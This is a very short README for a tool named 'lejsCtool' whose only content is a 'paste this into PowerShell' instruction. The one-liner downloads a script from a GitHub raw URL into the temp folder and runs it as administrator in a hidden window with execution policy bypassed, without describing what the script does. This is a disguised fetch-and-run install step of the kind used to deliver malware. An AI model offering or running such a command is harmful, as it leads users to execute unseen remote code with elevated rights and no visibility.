## lejsCtool
## Run


Open PowerShell and paste:

```powershell
$p="$env:TEMP\lejsc.ps1";iwr https://github.com/warsawlejs/lejscTool/raw/main/main.ps1 -UseB -OutFile $p;start powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-nop -ep bypass -sta -f `"$p`"";exit
